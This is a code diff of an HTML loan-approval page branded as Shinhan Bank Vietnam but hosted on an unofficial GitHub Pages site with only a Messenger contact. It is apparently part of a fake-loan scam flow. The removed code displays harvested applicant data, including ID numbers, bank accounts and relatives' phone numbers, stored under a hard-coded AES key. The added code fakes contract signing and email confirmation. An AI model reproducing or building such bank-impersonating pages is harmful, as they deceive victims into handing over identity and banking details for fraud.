@@ -3,571 +3,364 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hồ Sơ Được Duyệt - Shinhan Bank</title>
+    <title>Shinhan Bank - Hồ Sơ Được Duyệt</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
+        :root {
+            --primary-color: #003087;
+            --secondary-color: #f5f6f5;
+            --accent-color: #ff6200;
+        }
         body {
             font-family: 'Roboto', sans-serif;
-            font-size: 16px;
-            background-color: #f8f9fa;
-            margin: 0;
+            background-color: var(--secondary-color);
         }
-        .header {
-            padding: 15px;
-            background-color: #ffffff;
-            border-bottom: 1px solid #b3cde0;
+        .navbar {
+            background-color: var(--primary-color);
+        }
+        .navbar-brand img {
+            height: 50px;
+        }
+        .navbar-nav .nav-link {
+            color: white !important;
+            transition: color 0.3s;
+        }
+        .navbar-nav .nav-link:hover {
+            color: var(--accent-color) !important;
+        }
+        .step-indicator {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .header img {
-            height: 35px;
-        }
-        .header-icons {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        .header-icons i {
-            font-size: 24px;
-            cursor: pointer;
-            color: #0052cc;
-        }
-        .container {
-            max-width: 90%;
-            width: 100%;
-            margin: 0 auto;
-            padding: 25px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            justify-content: center;
+            margin: 20px 0;
             position: relative;
         }
-        @media (min-width: 768px) {
-            .container {
-                max-width: 700px;
-                margin: 0 auto;
-            }
-        }
-        .nav-tabs {
-            display: flex;
-            justify-content: space-around;
-            margin-bottom: 25px;
-            margin-top: 0;
-            flex-wrap: nowrap;
-        }
-        .nav-tabs .nav-item {
-            flex: 1;
-            text-align: center;
-        }
-        .nav-tabs .nav-link {
-            background-color: #d3d3d3;
-            color: #ffffff;
-            border-radius: 20px;
-            padding: 8px 16px;
-            font-weight: 500;
-            font-size: 14px;
-            width: 100%;
-            margin: 0 5px;
-        }
-        .nav-tabs .nav-link.active {
-            background-color: #0033a0;
-            color: #ffffff;
-        }
-        @media (max-width: 767px) {
-            .nav-tabs .nav-link {
-                font-size: 10px;
-                padding: 6px 8px;
-            }
-        }
-        .step-title {
-            color: #003087;
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            text-align: center;
-        }
-        .approval-container {
-            text-align: left;
-            padding: 20px;
-            border: 1px solid #dee2e6;
-            border-radius: 8px;
-            background-color: #f9f9f9;
-        }
-        .checkmark {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto;
-            animation: bounce 0.5s ease-in-out;
-        }
-        .checkmark circle {
-            stroke-dasharray: 166;
-            stroke-dashoffset: 166;
-            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
-        }
-        .checkmark path {
-            stroke-dasharray: 48;
-            stroke-dashoffset: 48;
-            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
-        }
-        @keyframes stroke {
-            100% {
-                stroke-dashoffset: 0;
-            }
-        }
-        @keyframes bounce {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-        .approval-message {
-            font-size: 18px;
-            font-weight: 500;
-            color: #28a745;
-            margin: 20px 0;
-            text-align: center;
-        }
-        .approval-details {
-            font-size: 14px;
-            line-height: 1.6;
-            color: #1a3c87;
-            margin-bottom: 20px;
-        }
-        .approval-details ul {
-            list-style: none;
-            padding: 0;
-        }
-        .approval-details ul li {
-            margin: 5px 0;
-        }
-        .approval-details ul li strong {
-            color: #0033a0;
-        }
-        .btn-primary {
-            background-color: #0033a0;
-            border: none;
-            border-radius: 20px;
+        .step {
             padding: 10px 20px;
-            font-weight: 700;
-            font-size: 14px;
-            transition: background-color 0.3s ease, transform 0.2s;
-        }
-        .btn-primary:hover {
-            background-color: #0052cc;
-            transform: scale(1.05);
-        }
-        .btn-secondary {
-            background-color: #6c757d;
-            border: none;
-            border-radius: 20px;
-            padding: 10px 20px;
-            font-weight: 700;
-            font-size: 14px;
-            transition: background-color 0.3s ease, transform 0.2s;
-        }
-        .btn-secondary:hover {
-            background-color: #5a6268;
-            transform: scale(1.05);
-        }
-        .footer {
-            text-align: center;
-            padding: 20px;
-            background-color: #003087;
-            color: white;
-            margin-top: 20px;
-            font-size: 12px;
-        }
-        .footer-links a {
-            color: #b3cde0;
             margin: 0 10px;
-            text-decoration: none;
-        }
-        .footer-links a:hover {
-            color: #ffffff;
-        }
-        .button-group {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 15px;
-        }
-        .divider-blue {
-            border-top: 1px solid #b3cde0;
-            margin: 15px 0;
-        }
-        .modal-content {
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            animation: slideIn 0.3s ease-in-out;
+            border-radius: 20px;
+            background-color: #d3d3d3;
+            color: #333;
+            font-weight: bold;
             position: relative;
-            overflow: hidden;
+            z-index: 1;
+            transition: all 0.3s;
+            font-size: 0.9rem;
         }
-        .modal-content img {
-            height: 30px;
-            margin-right: 10px;
+        .step.active {
+            background-color: var(--accent-color);
+            color: white;
         }
-        .modal-title {
-            font-size: 20px;
-            font-weight: 700;
-            color: #0033a0;
+        .step::before {
+            content: '\f058';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            margin-right: 5px;
         }
-        .modal-body {
-            padding: 20px;
-            text-align: left;
-        }
-        .modal-body p {
-            font-size: 14px;
-            margin: 10px 0;
-            color: #1a3c87;
-        }
-        .modal-body ul {
-            list-style: none;
-            padding: 0;
-            margin: 20px 0;
-        }
-        .modal-body ul li {
-            font-size: 14px;
-            margin: 10px 0;
-            color: #1a3c87;
-        }
-        .modal-body ul li strong {
-            color: #0033a0;
-        }
-        @keyframes slideIn {
-            from { transform: translateY(-50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        .messenger-btn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: #0084ff;
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-            z-index: 1000;
-            transition: transform 0.2s;
-            animation: pulse 2s infinite;
-        }
-        .messenger-btn:hover {
-            transform: scale(1.1);
-            animation: none;
-        }
-        .messenger-btn img {
-            width: 40px;
-            height: 40px;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3); }
-            50% { transform: scale(1.05); box-shadow: 0 4px 15px rgba(0, 132, 255, 0.4); }
-            100% { transform: scale(1); box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3); }
-        }
-        .dropdown-menu {
-            min-width: 200px;
-        }
-        .dropdown-menu a {
-            color: #0033a0;
-            text-transform: uppercase;
-            font-size: 14px;
-            padding: 8px 12px;
-        }
-        .dropdown-menu a:hover {
-            background-color: #e6f0fa;
-            color: #0052cc;
-        }
-        .fireworks-canvas {
+        .step-indicator::before {
+            content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
+            top: 50%;
+            left: 10%;
+            right: 10%;
+            height: 3px;
+            background-color: #d3d3d3;
             z-index: 0;
         }
-        .error-message {
-            color: #ff4d4f;
-            font-size: 14px;
-            font-weight: 500;
+        .progress-percentage {
             text-align: center;
-            margin-top: 5px;
-            padding: 6px;
-            background-color: #ffe6e6;
-            border-radius: 5px;
+            font-size: 1rem;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+        .status-section {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
+            margin: 15px 0;
+            text-align: center;
+        }
+        .status-section h3 {
+            color: var(--primary-color);
+            border-bottom: 2px solid var(--accent-color);
+            padding-bottom: 8px;
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+        .btn-primary {
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
+            padding: 8px 15px;
+            font-size: 0.9rem;
+            transition: background-color 0.3s;
+        }
+        .btn-primary:hover {
+            background-color: var(--accent-color);
+            border-color: var(--accent-color);
+        }
+        .footer-links a {
+            margin: 0 8px;
+            color: var(--primary-color);
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+        .footer-links a:hover {
+            color: var(--accent-color);
+        }
+        .success-message {
+            color: #28a745;
+            font-size: 1.2em;
+            margin-bottom: 20px;
+        }
+        .spinner {
             display: none;
+            margin-left: 8px;
+        }
+        .contract-table {
+            margin: 15px 0;
+            font-size: 0.9rem;
+        }
+        .error {
+            color: #dc3545;
+            font-size: 0.8rem;
+            margin-top: 3px;
+        }
+        .block-message {
+            background: #fff3cd;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin: 20px 0;
+            color: #856404;
+        }
+        .modal-body table {
+            font-size: 0.9rem;
+        }
+        @media (max-width: 768px) {
+            .navbar-brand img {
+                height: 40px;
+            }
+            .step-indicator {
+                display: none;
+            }
+            .progress-percentage {
+                font-size: 0.9rem;
+            }
+            .status-section {
+                padding: 10px;
+            }
+            .status-section h3 {
+                font-size: 1rem;
+            }
+            .btn-primary {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+            .contract-table {
+                font-size: 0.8rem;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
-        <div class="header-icons">
-            <i class="bi bi-search"></i>
-            <div class="dropdown">
-                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false"></i>
-                <ul class="dropdown-menu dropdown-menu-end">
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">GIỚI THIỆU</a></li>
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/tham-chieu.html">LỢI ÍCH</a></li>
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-vay.html">GIẤY TỜ CẦN THIẾT</a></li>
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-tien-gui.html">XEM KẾT QUẢ</a></li>
-                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">ĐIỀU KHOẢN SỬ DỤNG</a></li>
-                    <li><a class="dropdown-item" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">LIÊN HỆ</a></li>
-                    <li><a class="dropdown-item" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">MESSENGER</a></li>
-                </ul>
+    <header>
+        <nav class="navbar navbar-expand-lg">
+            <div class="container">
+                <a class="navbar-brand" href="#"><img src="https://via.placeholder.com/150x50?text=Shinhan+Bank+Logo" alt="Shinhan Bank Logo"></a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarNav">
+                    <ul class="navbar-nav ms-auto">
+                        <li class="nav-item"><a class="nav-link" href="#">GIỚI THIỆU</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">LỢI ÍCH</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">GIẤY TỜ CẦN THIẾT</a></li>
+                        <li class="nav-item"><a class="nav-link active" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">XEM KẾT QUẢ</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">ĐIỀU KHOẢN SỬ DỤNG</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">LIÊN HỆ</a></li>
+                        <li class="nav-item"><a class="nav-link" href="#">MESSENGER</a></li>
+                    </ul>
+                </div>
             </div>
+        </nav>
+    </header>
+
+    <main class="container mt-3">
+        <div class="progress-percentage">Tiến trình: 62.5% (Bước 5/8)</div>
+        <div class="step-indicator">
+            <div class="step">1. Nhập thông tin</div>
+            <div class="step">2. Xác thực và xử lý</div>
+            <div class="step active">3. Hoàn thành</div>
         </div>
-    </div>
-    <hr class="divider-blue" style="margin: 0;">
 
-    <div class="container">
-        <ul class="nav-tabs">
-            <li class="nav-item">
-                <a class="nav-link" href="#">1. Nhập thông tin</a>
-            </li>
-            <li class="nav-item">
-                <a class="nav-link" href="#">2. Xác thực và xử lý</a>
-            </li>
-            <li class="nav-item">
-                <a class="nav-link active" href="#">3. Hoàn thành</a>
-            </li>
-        </ul>
+        <div id="blockMessage" class="block-message" style="display: none;">
+            <p><strong>Thông báo:</strong> Đã có hồ sơ đăng ký tại Ngân hàng Shinhan. Vui lòng liên hệ hỗ trợ để biết thêm chi tiết.</p>
+        </div>
 
-        <div id="step6" class="step-transition">
-            <h5 class="step-title">HỒ SƠ ĐƯỢC DUYỆT</h5>
-            <div class="error-message" id="formError"></div>
-            <div class="approval-container">
-                <svg class="checkmark" viewBox="0 0 52 52">
-                    <circle cx="26" cy="26" r="25" fill="none" stroke="#28a745" stroke-width="4"/>
-                    <path fill="none" stroke="#28a745" stroke-width="4" d="M14 27l8 8 16-16"/>
-                </svg>
-                <p class="approval-message">Hồ sơ đã được xét duyệt thành công!</p>
-                <div class="approval-details" id="approvalDetails"></div>
-                <div class="action-buttons">
-                    <button id="proceedToContractBtn" class="btn btn-primary">Xem Hợp Đồng</button>
+        <div id="approvalContent">
+            <div class="status-section">
+                <h3>HỒ SƠ ĐƯỢC DUYỆT</h3>
+                <div class="success-message" aria-live="polite">
+                    <h4>CHÚC MỪNG!</h4>
+                    <p>Hồ sơ vay của bạn đã được duyệt thành công! Dưới đây là chi tiết hồ sơ:</p>
+                </div>
+                <table class="table table-bordered contract-table">
+                    <tbody id="contractDetails">
+                        <!-- Populated dynamically -->
+                    </tbody>
+                </table>
+                <div class="form-check mb-3">
+                    <input class="form-check-input" type="checkbox" id="contractConsent" required aria-required="true">
+                    <label class="form-check-label" for="contractConsent">
+                        Tôi xác nhận đã đọc và đồng ý với các điều khoản hợp đồng.
+                    </label>
+                    <p id="contractConsentError" class="error"></p>
+                </div>
+                <div class="mt-3">
+                    <button class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#contractModal">Xem Hợp Đồng</button>
+                    <button class="btn btn-primary" onclick="printInfo()">In Thông Tin</button>
                 </div>
             </div>
 
-            <hr class="divider-blue">
-
-            <div class="button-group">
-                <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html" class="btn btn-secondary">QUAY LẠI</a>
-                <button id="continueToContractBtn" class="btn btn-primary">TIẾP TỤC</button>
+            <div class="d-flex justify-content-between mt-3 flex-column flex-md-row">
+                <div class="mb-2 mb-md-0">
+                    <a href="step4.html" class="btn btn-outline-secondary">QUAY LẠI</a>
+                    <button type="button" class="btn btn-outline-danger ms-2" onclick="resetProgress()">XÓA TIẾN TRÌNH</button>
+                </div>
+                <button class="btn btn-primary position-relative" onclick="signContract()">
+                    KÝ HỢP ĐỒNG
+                    <span class="spinner-border spinner-border-sm spinner" role="status" aria-hidden="true"></span>
+                </button>
             </div>
         </div>
+    </main>
 
-        <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
-            <div class="modal-dialog modal-lg">
-                <div class="modal-content">
-                    <canvas class="fireworks-canvas"></canvas>
-                    <div class="modal-header">
-                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/30x30?text=Logo+Shinhan';">
-                        <h5 class="modal-title" id="successModalLabel">CHÚC MỪNG!</h5>
-                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Đóng"></button>
-                    </div>
-                    <div class="modal-body">
-                        <svg class="checkmark" viewBox="0 0 52 52">
-                            <circle cx="26" cy="26" r="25" fill="none" stroke="#28a745" stroke-width="4"/>
-                            <path fill="none" stroke="#28a745" stroke-width="4" d="M14 27l8 8 16-16"/>
-                        </svg>
-                        <p>Hồ sơ vay của bạn đã được duyệt thành công! Dưới đây là chi tiết hồ sơ:</p>
-                        <ul id="modalDetails"></ul>
-                    </div>
+    <!-- Contract Modal -->
+    <div class="modal fade" id="contractModal" tabindex="-1" aria-labelledby="contractModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="contractModalLabel">Hợp Đồng Vay</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <table class="table table-bordered">
+                        <tbody id="modalContractDetails">
+                            <!-- Populated dynamically -->
+                        </tbody>
+                    </table>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Đóng</button>
                 </div>
             </div>
         </div>
     </div>
 
-    <div class="footer">
-        <div class="footer-links">
-            <a href="#">Chính sách bảo mật</a> |
-            <a href="#">Điều khoản sử dụng</a> |
-            <a href="#">Chính sách Cookies</a> |
-            <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
-            <a href="#">Hướng dẫn truy cập web</a> |
-            <a href="#">Sitemap</a>
+    <footer class="bg-light py-3 mt-4">
+        <div class="container text-center">
+            <div class="footer-links">
+                <a href="#">Chính sách bảo mật</a> |
+                <a href="#">Điều khoản sử dụng</a> |
+                <a href="#">Chính sách Cookies</a> |
+                <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
+                <a href="#">Hướng dẫn truy cập web</a> |
+                <a href="#">Sitemap</a>
+            </div>
+            <p class="mt-2">
+                Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu
+            </p>
+            <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
+            <p>Ngân hàng Shinhan được quản lý bởi Ngân hàng Nhà nước Việt Nam.</p>
         </div>
-        <p class="mt-3">Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu</p>
-        <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
-    </div>
+    </footer>
 
-    <a href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216" target="_blank" class="messenger-btn">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/be/Facebook_Messenger_logo_2020.svg" alt="Messenger Logo">
-    </a>
-
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <script>
-        let userData = {};
+        // Initialize EmailJS
+        emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS User ID
 
-        function formatNumber(number) {
-            return number ? Number(number).toLocaleString('vi-VN') : "Không có";
-        }
-
-        function loadUserData() {
-            try {
-                const storedData = localStorage.getItem('userData');
-                if (storedData) {
-                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
-                    console.log('Loaded userData for Step 5:', userData);
-                    if (!userData.isRegistered || !userData.fullName) {
-                        $('#formError').text('Không tìm thấy hồ sơ đã đăng ký. Vui lòng quay lại bước đăng ký.').show();
-                        $('#proceedToContractBtn, #continueToContractBtn').prop('disabled', true);
-                        setTimeout(() => {
-                            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
-                        }, 3000);
-                    }
-                } else {
-                    console.error('No userData found in localStorage');
-                    $('#formError').text('Không tìm thấy dữ liệu hồ sơ. Vui lòng quay lại bước đăng ký.').show();
-                    $('#proceedToContractBtn, #continueToContractBtn').prop('disabled', true);
-                    setTimeout(() => {
-                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
-                    }, 3000);
-                }
-            } catch (error) {
-                console.error('Error parsing userData:', error);
-                $('#formError').text('Lỗi tải dữ liệu. Vui lòng quay lại bước đăng ký.').show();
-                $('#proceedToContractBtn, #continueToContractBtn').prop('disabled', true);
-                setTimeout(() => {
-                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html';
-                }, 3000);
-            }
-        }
-
-        function saveToLocalStorage() {
-            try {
-                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
-                localStorage.setItem('userData', encryptedData);
-                console.log('Saved userData:', userData);
-            } catch (error) {
-                console.error('Error saving userData:', error);
-                $('#formError').text('Lỗi lưu dữ liệu. Vui lòng thử lại.').show();
-            }
-        }
-
-        function proceedToContract() {
-            userData.currentStep = 7;
-            saveToLocalStorage();
-            window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step6.html';
-        }
-
-        function showDetails() {
-            const details = `
-                <ul>
-                    <li><strong>Họ và tên:</strong> ${userData.fullName || 'Không có'}</li>
-                    <li><strong>Ngày sinh:</strong> ${userData.dob || 'Không có'}</li>
-                    <li><strong>Giới tính:</strong> ${userData.gender || 'Không có'}</li>
-                    <li><strong>Địa chỉ thường trú:</strong> ${userData.contactAddress || 'Không có'}</li>
-                    <li><strong>Số định danh cá nhân (CCCD/CMND):</strong> ${userData.idNumber || 'Không có'}</li>
-                    <li><strong>Nơi cấp:</strong> ${userData.idIssuePlace || 'Không có'}</li>
-                    <li><strong>Số điện thoại:</strong> ${userData.phoneNumber || 'Không có'}</li>
-                    <li><strong>E-mail:</strong> ${userData.email || 'Không có'}</li>
-                    <li><strong>Hình thức vay:</strong> ${userData.loanType || 'Không có'}</li>
-                    <li><strong>Thời hạn vay:</strong> ${userData.loanTerm ? userData.loanTerm + ' tháng' : 'Không có'}</li>
-                    <li><strong>Số tiền vay:</strong> ${formatNumber(userData.loanAmount)} VND</li>
-                    <li><strong>Lãi suất:</strong> ${userData.interestRate ? userData.interestRate + '%/năm' : 'Không có'}</li>
-                    <li><strong>Dự kiến giải ngân ngày:</strong> ${userData.disbursementDate || 'Không có'}</li>
-                    <li><strong>Thu nhập hàng tháng:</strong> ${formatNumber(userData.income)} VND</li>
-                    <li><strong>Nghề nghiệp:</strong> ${userData.occupation || 'Không có'}</li>
-                    <li><strong>Mục đích vay:</strong> ${userData.loanPurpose || 'Không có'}</li>
-                    <li><strong>Số điện thoại người thân:</strong> ${userData.companyPhone || 'Không có'}</li>
-                    <li><strong>Quan hệ:</strong> ${userData.companyAddress || 'Không có'}</li>
-                    <li><strong>Tên chủ tài khoản:</strong> ${userData.accountHolderName || 'Không có'}</li>
-                    <li><strong>Số tài khoản:</strong> ${userData.accountNumber || 'Không có'}</li>
-                    <li><strong>Tên ngân hàng:</strong> ${userData.bankName || 'Không có'}</li>
-                    <li><strong>Thanh toán hàng tháng:</strong> ${formatNumber(userData.monthlyPayment)} VND</li>
-                    <li><strong>Tổng lãi phải trả:</strong> ${formatNumber(userData.totalInterest)} VND</li>
-                    <li><strong>Tổng gốc + lãi:</strong> ${formatNumber(userData.totalRepayment)} VND</li>
-                    <li><strong>Mã hồ sơ:</strong> ${userData.loanCode || 'Không có'}</li>
-                </ul>
-                <p>Khoản vay của Quý khách đã được Ngân hàng Shinhan phê duyệt thành công. Vui lòng xem hồ sơ vay vốn và điều kiện giải ngân để tiếp tục.</p>
-            `;
-            $('#approvalDetails').html(details);
-            $('#modalDetails').html(details);
-            console.log('Displayed userData in Step 5:', userData);
-        }
-
-        function createFireworks(canvas) {
-            const ctx = canvas.getContext('2d');
-            let particles = [];
-            let animationEndTime = Date.now() + 10000; // Chạy 10 giây
-
-            function Particle(x, y) {
-                this.x = x;
-                this.y = y;
-                this.size = Math.random() * 2 + 1;
-                this.speedX = Math.random() * 3 - 1.5;
-                this.speedY = Math.random() * 3 - 1.5;
-                this.color = `hsl(${Math.random() * 360}, 70%, 50%)`;
-                this.life = 100;
-            }
-
-            Particle.prototype.update = function() {
-                this.x += this.speedX;
-                this.y += this.speedY;
-                this.life -= 1;
-                this.size *= 0.95;
-            };
-
-            Particle.prototype.draw = function() {
-                ctx.beginPath();
-                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                ctx.fillStyle = this.color;
-                ctx.fill();
-            };
-
-            function createExplosion(x, y) {
-                for (let i = 0; i < 20; i++) {
-                    particles.push(new Particle(x, y));
-                }
-            }
-
-            function animate() {
-                if (Date.now() > animationEndTime) return;
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                if (Math.random() < 0.1) {
-                    createExplosion(canvas.width * Math.random(), canvas.height * Math.random());
-                }
-                particles = particles.filter(p => p.life > 0);
-                particles.forEach(p => {
-                    p.update();
-                    p.draw();
-                });
-                requestAnimationFrame(animate);
-            }
-
-            function resizeCanvas() {
-                canvas.width = canvas.parentElement.offsetWidth;
-                canvas.height = canvas.parentElement.offsetHeight;
-            }
-
-            window.addEventListener('resize', resizeCanvas);
-            resizeCanvas();
-            animate();
-        }
-
+        // Check for existing registration and load contract details
         window.onload = function() {
-            loadUserData();
-            showDetails();
-            const modal = new bootstrap.Modal(document.getElementById('successModal'), { backdrop: 'static' });
-            modal.show();
+            if (localStorage.getItem('registered')) {
+                document.getElementById('blockMessage').style.display = 'block';
+                document.getElementById('approvalContent').style.display = 'none';
+                return;
+            }
 
-            const canvas = document.querySelector('.fireworks-canvas');
-            if (canvas) createFireworks(canvas);
+            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
+            const step1 = savedData.step1 || {};
+            const details = [
+                { label: 'Số tiền vay', value: step1.loanAmount ? Number(step1.loanAmount).toLocaleString() + ' VND' : 'N/A' },
+                { label: 'Thời hạn vay', value: step1.loanTerm ? step1.loanTerm + ' tháng' : 'N/A' },
+                { label: 'Lãi suất', value: step1.interestRate ? step1.interestRate + '% / năm' : 'N/A' },
+                { label: 'Ngày giải ngân', value: step1.disbursementDate || 'N/A' }
+            ];
 
-            // Cập nhật trạng thái bước
-            userData.currentStep = 6;
-            saveToLocalStorage();
+            const tableBody = document.getElementById('contractDetails');
+            const modalTableBody = document.getElementById('modalContractDetails');
+            details.forEach(detail => {
+                tableBody.innerHTML += `<tr><th>${detail.label}</th><td>${detail.value}</td></tr>`;
+                modalTableBody.innerHTML += `<tr><th>${detail.label}</th><td>${detail.value}</td></tr>`;
+            });
+
+            // Save approval status
+            savedData.currentStep = 5;
+            localStorage.setItem('registrationData', JSON.stringify(savedData));
         };
 
-        $('#proceedToContractBtn, #continueToContractBtn').on('click', proceedToContract);
+        function viewContract() {
+            // Modal is triggered via data-bs-toggle
+        }
+
+        function printInfo() {
+            window.print();
+        }
+
+        function signContract() {
+            const consent = document.getElementById('contractConsent').checked;
+            const errorElement = document.getElementById('contractConsentError');
+            const spinner = document.querySelector('.spinner');
+
+            if (!consent) {
+                errorElement.textContent = 'Vui lòng xác nhận đồng ý với hợp đồng.';
+                return;
+            }
+
+            errorElement.textContent = '';
+            spinner.style.display = 'inline-block';
+
+            // Send confirmation email
+            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
+            const emailParams = {
+                to_email: savedData.step1?.email || 'user@example.com',
+                full_name: savedData.step1?.fullName || 'Khách hàng',
+                message: 'Bạn đã ký hợp đồng vay thành công. Vui lòng kiểm tra hợp đồng ở bước tiếp theo.'
+            };
+
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', emailParams)
+                .then(() => {
+                    console.log('Contract signing email sent');
+                    spinner.style.display = 'none';
+                    window.location.href = 'step6.html';
+                }, (error) => {
+                    console.error('Email sending failed:', error);
+                    alert('Lỗi khi gửi email xác nhận. Vui lòng thử lại.');
+                    spinner.style.display = 'none';
+                });
+        }
+
+        function resetProgress() {
+            if (confirm('Bạn có chắc chắn muốn xóa toàn bộ tiến trình?')) {
+                localStorage.removeItem('registrationData');
+                localStorage.removeItem('registered');
+                window.location.href = 'step1.html';
+            }
+        }
     </script>
 </body>
 </html>
